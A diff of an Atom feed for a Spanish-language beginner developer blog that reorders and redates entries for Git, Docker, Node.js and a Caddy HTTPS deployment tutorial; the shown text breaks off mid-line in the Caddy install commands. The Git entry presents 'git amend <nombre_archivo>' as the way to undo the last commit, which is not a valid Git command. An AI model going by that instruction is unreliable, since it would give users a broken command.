@@ -13,106 +13,9 @@
 	</author>
 	
 	<entry>
-		<title>Git 101</title>
-		<link href="https://update-me.com/posts/git/"/>
-		<updated>2025-05-08T00:00:00+00:00</updated>
-		<id>https://update-me.com/posts/git/</id>
-		<content type="html">
-		  &lt;p&gt;Git es la herramienta &lt;strong&gt;más importante&lt;/strong&gt; que deberías estar usando para desarrollar. Sin ella, no podrás colaborar en proyectos grandes, y te arriesgas a perder tu trabajo o romperlo tu mismo.&lt;/p&gt;
-&lt;h2 id=&quot;%C2%BFqu%C3%A9-es-git%3F&quot;&gt;¿Qué es Git? &lt;a class=&quot;direct-link&quot; href=&quot;#%C2%BFqu%C3%A9-es-git%3F&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Git soluciona un problema básico en el desarrollo de software: la gestión de versiones. Cuando trabajas en un proyecto, es probable que hagas cambios en el código pero luego no quedes satisfecho con los resultados. ¿Que haces entonces? Si fuiste precavido y guardaste una copia de seguridad, puedes volver a esa versión anterior. Pero si no lo hiciste, tendrás que editar manualmente el código hasta su estado anterior, esto es tedioso, y en ocasiones, imposible.&lt;/p&gt;
-&lt;p&gt;Git te evita este problema, puedes guardar diferentes versiones de tu código y volver a ellas cuando necesitas. Te permite crear copias de seguridad de tu trabajo y colaborar con otras personas en el mismo proyecto sin miedo a perder tu trabajo o romperlo con cambios de otros.&lt;/p&gt;
-&lt;h2 id=&quot;instalaci%C3%B3n&quot;&gt;Instalación &lt;a class=&quot;direct-link&quot; href=&quot;#instalaci%C3%B3n&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Para instalar Git, puedes usar el siguiente comando:&lt;/p&gt;
-&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;configuraci%C3%B3n&quot;&gt;Configuración &lt;a class=&quot;direct-link&quot; href=&quot;#configuraci%C3%B3n&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Una vez instalado, es importante configurarlo con tu nombre y correo electrónico. Esto es importante porque Git utiliza esta información para identificar quién hizo qué cambios en el código.&lt;/p&gt;
-&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; config --global user.name &lt;span class=&quot;token string&quot;&gt;&quot;Tu Nombre&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; config --global user.email &lt;span class=&quot;token string&quot;&gt;&quot;Tu Correo&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Puedes comprobar que la configuración se ha guardado correctamente con el siguiente comando:&lt;/p&gt;
-&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; config --list&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;crear-repositorio-local&quot;&gt;Crear repositorio local &lt;a class=&quot;direct-link&quot; href=&quot;#crear-repositorio-local&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Para crear un repositorio en la carpeta actual, puedes usar el siguiente comando:&lt;/p&gt;
-&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; init&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Esto creará una carpeta oculta llamada &lt;code&gt;.git&lt;/code&gt; en la carpeta actual. Esta carpeta contiene toda la información necesaria para gestionar el repositorio, incluyendo el historial de cambios y las versiones del código.&lt;/p&gt;
-&lt;p&gt;No tendrás que preocuparte por esta carpeta, Git la gestionará por ti.&lt;/p&gt;
-&lt;h2 id=&quot;%C3%A1reas-de-trabajo&quot;&gt;Áreas de trabajo &lt;a class=&quot;direct-link&quot; href=&quot;#%C3%A1reas-de-trabajo&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Git tiene tres áreas de trabajo:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Working Directory&lt;/strong&gt;: Es la carpeta donde tienes tu código. Aquí es donde haces los cambios en el código.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Staging Area&lt;/strong&gt;: Es una zona intermedia donde puedes preparar los cambios que quieres guardar en el repositorio. Aquí es donde decides qué cambios quieres incluir en el próximo commit.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Repository&lt;/strong&gt;: Es la carpeta oculta &lt;code&gt;.git&lt;/code&gt; donde Git guarda toda la información sobre el repositorio, incluyendo el historial de cambios y las versiones del código.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Puedes comprobar el estado de tu repositorio con el siguiente comando:&lt;/p&gt;
-&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; status&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Esto te mostrará qué archivos han sido modificados, cuáles están en la Staging Area y cuáles no están siendo rastreados por Git.&lt;/p&gt;
-&lt;h2 id=&quot;a%C3%B1adir-archivos&quot;&gt;Añadir archivos &lt;a class=&quot;direct-link&quot; href=&quot;#a%C3%B1adir-archivos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Para añadir archivos al repositorio, puedes usar el siguiente comando:&lt;/p&gt;
-&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;nombre_archivo&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Esto añadirá el archivo a la Staging Area. Si quieres añadir todos los archivos, puedes usar el siguiente comando:&lt;/p&gt;
-&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;confirmar-cambios&quot;&gt;Confirmar cambios &lt;a class=&quot;direct-link&quot; href=&quot;#confirmar-cambios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Para confirmar los cambios y guardarlos en el repositorio, puedes usar el siguiente comando:&lt;/p&gt;
-&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; commit -m &lt;span class=&quot;token string&quot;&gt;&quot;Mensaje de confirmación&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Es &lt;strong&gt;muy&lt;/strong&gt; importante que escribas un mensaje de confirmación claro y conciso con el cambio que has realizado. En especial si estas trabajando en un proyecto con otras personas. Esto ayudará a los demás a entender qué cambios has realizado y por qué.&lt;/p&gt;
-&lt;p&gt;No hacer esto puede llevar a confusiones o incluso cancelar tus cambios en el repositorio.&lt;/p&gt;
-&lt;h2 id=&quot;ver-el-historial-de-cambios&quot;&gt;Ver el historial de cambios &lt;a class=&quot;direct-link&quot; href=&quot;#ver-el-historial-de-cambios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Para ver el historial de cambios en el repositorio, puedes usar el siguiente comando:&lt;/p&gt;
-&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; log&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;deshacer-commit&quot;&gt;Deshacer commit &lt;a class=&quot;direct-link&quot; href=&quot;#deshacer-commit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Si quieres deshacer el último commit para arreglar algo, puedes usar el siguiente comando:&lt;/p&gt;
-&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; amend &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;nombre_archivo&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Esto deshará el último commit y te permitirá hacer cambios en el código antes de volver a confirmarlo. Esto es útil si te das cuenta de que has cometido un error en el último commit o si quieres añadir más cambios antes de confirmar.&lt;/p&gt;
-
-			
-		</content>
-	</entry>
-	
-	<entry>
-		<title>Despliegue con HTTPS y Caddy</title>
-		<link href="https://update-me.com/posts/despliegue-caddy/"/>
-		<updated>2025-05-09T00:00:00+00:00</updated>
-		<id>https://update-me.com/posts/despliegue-caddy/</id>
-		<content type="html">
-		  &lt;p&gt;Añadir un certificado SSL/TLS puede hacerse de varias formas, en esta vamos a utilizar Caddy para añadir https a cualquier servidor web que tengamos funcionando.&lt;/p&gt;
-&lt;p&gt;Necesitarás:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Un servidor web, este puede ser un repositorio, un contenedor de docker, una aplicación que hemos instalado y lanzado, etc.&lt;/li&gt;
-&lt;li&gt;Un dominio, esto es necesario para solicitar un certificado SSL/TLS.&lt;/li&gt;
-&lt;li&gt;Un VPS en cualquier plataforma como linode o digitalocean.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&quot;configuraci%C3%B3n-dns&quot;&gt;Configuración DNS &lt;a class=&quot;direct-link&quot; href=&quot;#configuraci%C3%B3n-dns&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Lo primero es configurar nuestro servidor DNS para que apunte al VPS.&lt;/p&gt;
-&lt;p&gt;Ve a tu proveedor de dominio y añade un registro &amp;quot;a&amp;quot; que apunte a la dirección IP de tu servidor.&lt;/p&gt;
-&lt;p&gt;Comprueba la &lt;a href=&quot;https://dnschecker.org/&quot;&gt;propagación de dns&lt;/a&gt; para saber si ya es está redirigiendo.&lt;/p&gt;
-&lt;h2 id=&quot;configuraci%C3%B3n-caddy&quot;&gt;Configuración Caddy &lt;a class=&quot;direct-link&quot; href=&quot;#configuraci%C3%B3n-caddy&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Hay &lt;a href=&quot;https://caddyserver.com/docs/install&quot;&gt;guias&lt;/a&gt; para las diferentes formas de instalación de Caddy.&lt;/p&gt;
-&lt;p&gt;En nuestro caso, con ubuntu:&lt;/p&gt;
-&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; update&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; -y debian-keyring debian-archive-keyring apt-transport-https &lt;span class=&quot;token function&quot;&gt;curl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;curl&lt;/span&gt; -1sLf &lt;span class=&quot;token string&quot;&gt;&#39;https://dl.cloudsmith.io/public/caddy/stable/gpg.key&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;curl&lt;/span&gt; -1sLf &lt;span class=&quot;token string&quot;&gt;&#39;https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;tee&lt;/span&gt; /etc/apt/sources.list.d/caddy-stable.list&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; update&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; caddy&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vamos a utilizar Caddy como un proxy reverso, este escuchará primero en el puerto 80 para solicitar los certificados SSL/TLS, si el DNS esta apuntando correctamente, el proceso debería ser exitoso y Caddy empezará a escuchar solicitudes HTTP en el puerto 443 utilizando HTTPS, y se comunicará localmente con tu servidor funcionando en el puerto que configures.&lt;/p&gt;
-&lt;p&gt;Caddy funciona mediante archivos de configuración llamados &lt;code&gt;Caddyfile&lt;/code&gt;:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;cyberbunny.online {
-    reverse_proxy localhost:8000
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Donde &lt;code&gt;cyberbunny.online&lt;/code&gt; es el dominio, &lt;code&gt;reverse_proxy&lt;/code&gt; el modo en el que queremos que actue Caddy y &lt;code&gt;localhost:8000&lt;/code&gt; la dirección y puerto donde tenemos nuestro servidor web funcionando.&lt;/p&gt;
-&lt;p&gt;Edita el archivo en &lt;code&gt;/etc/caddy/Caddyfile&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Caddy no usará la configuración hasta que lo reinicies con &lt;code&gt;sudo systemctl restart caddy&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Cuando lo reinicies, comprueba el estado de la obtención del certificado con &lt;code&gt;sudo systemctl status caddy&lt;/code&gt;, si ves algo como esto, es que ha funcionado correctamente:&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Si la obtención del certificado falló, puede que debas esperar un poco hasta que el DNS se propague, además, Caddy espera varios minutos antes de volver a intentar la obtención del certificado, así que si no funciona a la primera, no te preocupes, espera un poco y vuelve a consultar el estado mas tarde mientras verificas que tu DNS está apuntando correctamente y tu configuración es correcta.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Mientras también puedes arrancar tu servidor web si no lo has hecho ya, Caddy no necesita que el servidor web esté funcionando para obtener el certificado, pero si lo necesitas para comprobar que al final funciona correctamente.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-			
-		</content>
-	</entry>
-	
-	<entry>
 		<title>Docker 101</title>
 		<link href="https://update-me.com/posts/docker/"/>
-		<updated>2025-05-09T00:00:00+00:00</updated>
+		<updated>2025-05-08T00:00:00+00:00</updated>
 		<id>https://update-me.com/posts/docker/</id>
 		<content type="html">
 		  &lt;h2 id=&quot;instalaci%C3%B3n&quot;&gt;Instalación &lt;a class=&quot;direct-link&quot; href=&quot;#instalaci%C3%B3n&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
@@ -178,9 +81,64 @@ Puedes ver todos los contenedores que tienes en tu ordenador utilizando el sigui
 	</entry>
 	
 	<entry>
+		<title>Git 101</title>
+		<link href="https://update-me.com/posts/git/"/>
+		<updated>2025-05-08T00:00:00+00:00</updated>
+		<id>https://update-me.com/posts/git/</id>
+		<content type="html">
+		  &lt;p&gt;Git es la herramienta &lt;strong&gt;más importante&lt;/strong&gt; que deberías estar usando para desarrollar. Sin ella, no podrás colaborar en proyectos grandes, y te arriesgas a perder tu trabajo o romperlo tu mismo.&lt;/p&gt;
+&lt;h2 id=&quot;%C2%BFqu%C3%A9-es-git%3F&quot;&gt;¿Qué es Git? &lt;a class=&quot;direct-link&quot; href=&quot;#%C2%BFqu%C3%A9-es-git%3F&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Git soluciona un problema básico en el desarrollo de software: la gestión de versiones. Cuando trabajas en un proyecto, es probable que hagas cambios en el código pero luego no quedes satisfecho con los resultados. ¿Que haces entonces? Si fuiste precavido y guardaste una copia de seguridad, puedes volver a esa versión anterior. Pero si no lo hiciste, tendrás que editar manualmente el código hasta su estado anterior, esto es tedioso, y en ocasiones, imposible.&lt;/p&gt;
+&lt;p&gt;Git te evita este problema, puedes guardar diferentes versiones de tu código y volver a ellas cuando necesitas. Te permite crear copias de seguridad de tu trabajo y colaborar con otras personas en el mismo proyecto sin miedo a perder tu trabajo o romperlo con cambios de otros.&lt;/p&gt;
+&lt;h2 id=&quot;instalaci%C3%B3n&quot;&gt;Instalación &lt;a class=&quot;direct-link&quot; href=&quot;#instalaci%C3%B3n&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Para instalar Git, puedes usar el siguiente comando:&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;configuraci%C3%B3n&quot;&gt;Configuración &lt;a class=&quot;direct-link&quot; href=&quot;#configuraci%C3%B3n&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Una vez instalado, es importante configurarlo con tu nombre y correo electrónico. Esto es importante porque Git utiliza esta información para identificar quién hizo qué cambios en el código.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; config --global user.name &lt;span class=&quot;token string&quot;&gt;&quot;Tu Nombre&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; config --global user.email &lt;span class=&quot;token string&quot;&gt;&quot;Tu Correo&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Puedes comprobar que la configuración se ha guardado correctamente con el siguiente comando:&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; config --list&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;crear-repositorio-local&quot;&gt;Crear repositorio local &lt;a class=&quot;direct-link&quot; href=&quot;#crear-repositorio-local&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Para crear un repositorio en la carpeta actual, puedes usar el siguiente comando:&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; init&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Esto creará una carpeta oculta llamada &lt;code&gt;.git&lt;/code&gt; en la carpeta actual. Esta carpeta contiene toda la información necesaria para gestionar el repositorio, incluyendo el historial de cambios y las versiones del código.&lt;/p&gt;
+&lt;p&gt;No tendrás que preocuparte por esta carpeta, Git la gestionará por ti.&lt;/p&gt;
+&lt;h2 id=&quot;%C3%A1reas-de-trabajo&quot;&gt;Áreas de trabajo &lt;a class=&quot;direct-link&quot; href=&quot;#%C3%A1reas-de-trabajo&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Git tiene tres áreas de trabajo:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Working Directory&lt;/strong&gt;: Es la carpeta donde tienes tu código. Aquí es donde haces los cambios en el código.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Staging Area&lt;/strong&gt;: Es una zona intermedia donde puedes preparar los cambios que quieres guardar en el repositorio. Aquí es donde decides qué cambios quieres incluir en el próximo commit.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Repository&lt;/strong&gt;: Es la carpeta oculta &lt;code&gt;.git&lt;/code&gt; donde Git guarda toda la información sobre el repositorio, incluyendo el historial de cambios y las versiones del código.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Puedes comprobar el estado de tu repositorio con el siguiente comando:&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; status&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Esto te mostrará qué archivos han sido modificados, cuáles están en la Staging Area y cuáles no están siendo rastreados por Git.&lt;/p&gt;
+&lt;h2 id=&quot;a%C3%B1adir-archivos&quot;&gt;Añadir archivos &lt;a class=&quot;direct-link&quot; href=&quot;#a%C3%B1adir-archivos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Para añadir archivos al repositorio, puedes usar el siguiente comando:&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;nombre_archivo&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Esto añadirá el archivo a la Staging Area. Si quieres añadir todos los archivos, puedes usar el siguiente comando:&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;confirmar-cambios&quot;&gt;Confirmar cambios &lt;a class=&quot;direct-link&quot; href=&quot;#confirmar-cambios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Para confirmar los cambios y guardarlos en el repositorio, puedes usar el siguiente comando:&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; commit -m &lt;span class=&quot;token string&quot;&gt;&quot;Mensaje de confirmación&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Es &lt;strong&gt;muy&lt;/strong&gt; importante que escribas un mensaje de confirmación claro y conciso con el cambio que has realizado. En especial si estas trabajando en un proyecto con otras personas. Esto ayudará a los demás a entender qué cambios has realizado y por qué.&lt;/p&gt;
+&lt;p&gt;No hacer esto puede llevar a confusiones o incluso cancelar tus cambios en el repositorio.&lt;/p&gt;
+&lt;h2 id=&quot;ver-el-historial-de-cambios&quot;&gt;Ver el historial de cambios &lt;a class=&quot;direct-link&quot; href=&quot;#ver-el-historial-de-cambios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Para ver el historial de cambios en el repositorio, puedes usar el siguiente comando:&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; log&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;deshacer-commit&quot;&gt;Deshacer commit &lt;a class=&quot;direct-link&quot; href=&quot;#deshacer-commit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Si quieres deshacer el último commit para arreglar algo, puedes usar el siguiente comando:&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; amend &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;nombre_archivo&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Esto deshará el último commit y te permitirá hacer cambios en el código antes de volver a confirmarlo. Esto es útil si te das cuenta de que has cometido un error en el último commit o si quieres añadir más cambios antes de confirmar.&lt;/p&gt;
+
+			
+		</content>
+	</entry>
+	
+	<entry>
 		<title>nvm + npm + Node.js 101</title>
 		<link href="https://update-me.com/posts/npm-node/"/>
-		<updated>2025-05-09T00:00:00+00:00</updated>
+		<updated>2025-05-08T00:00:00+00:00</updated>
 		<id>https://update-me.com/posts/npm-node/</id>
 		<content type="html">
 		  &lt;p&gt;Nodejs y npm son herramientas muy potentes para el desarrollo de aplicaciones web.&lt;/p&gt;
@@ -239,6 +197,215 @@ Puedes ver todos los contenedores que tienes en tu ordenador utilizando el sigui
 &lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token property&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token property&quot;&gt;&quot;dev&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;nodemon -e js,html,css,njk index.js&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Luego, puedes ejecutar el script con el siguiente comando:&lt;/p&gt;
 &lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; run dev&lt;/code&gt;&lt;/pre&gt;
+
+			
+		</content>
+	</entry>
+	
+	<entry>
+		<title>Despliegue con HTTPS y Caddy</title>
+		<link href="https://update-me.com/posts/despliegue-caddy/"/>
+		<updated>2025-05-09T00:00:00+00:00</updated>
+		<id>https://update-me.com/posts/despliegue-caddy/</id>
+		<content type="html">
+		  &lt;p&gt;Añadir un certificado SSL/TLS puede hacerse de varias formas, en esta vamos a utilizar Caddy para añadir https a cualquier servidor web que tengamos funcionando.&lt;/p&gt;
+&lt;p&gt;Necesitarás:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Un servidor web, este puede ser un repositorio, un contenedor de docker, una aplicación que hemos instalado y lanzado, etc.&lt;/li&gt;
+&lt;li&gt;Un dominio, esto es necesario para solicitar un certificado SSL/TLS.&lt;/li&gt;
+&lt;li&gt;Un VPS en cualquier plataforma como linode o digitalocean.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;configuraci%C3%B3n-dns&quot;&gt;Configuración DNS &lt;a class=&quot;direct-link&quot; href=&quot;#configuraci%C3%B3n-dns&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Lo primero es configurar nuestro servidor DNS para que apunte al VPS.&lt;/p&gt;
+&lt;p&gt;Ve a tu proveedor de dominio y añade un registro &amp;quot;a&amp;quot; que apunte a la dirección IP de tu servidor.&lt;/p&gt;
+&lt;p&gt;Comprueba la &lt;a href=&quot;https://dnschecker.org/&quot;&gt;propagación de dns&lt;/a&gt; para saber si ya es está redirigiendo.&lt;/p&gt;
+&lt;h2 id=&quot;configuraci%C3%B3n-caddy&quot;&gt;Configuración Caddy &lt;a class=&quot;direct-link&quot; href=&quot;#configuraci%C3%B3n-caddy&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Hay &lt;a href=&quot;https://caddyserver.com/docs/install&quot;&gt;guias&lt;/a&gt; para las diferentes formas de instalación de Caddy.&lt;/p&gt;
+&lt;p&gt;En nuestro caso, con ubuntu:&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; update&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; -y debian-keyring debian-archive-keyring apt-transport-https &lt;span class=&quot;token function&quot;&gt;curl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;curl&lt;/span&gt; -1sLf &lt;span class=&quot;token string&quot;&gt;&#39;https://dl.cloudsmith.io/public/caddy/stable/gpg.key&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;curl&lt;/span&gt; -1sLf &lt;span class=&quot;token string&quot;&gt;&#39;https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token 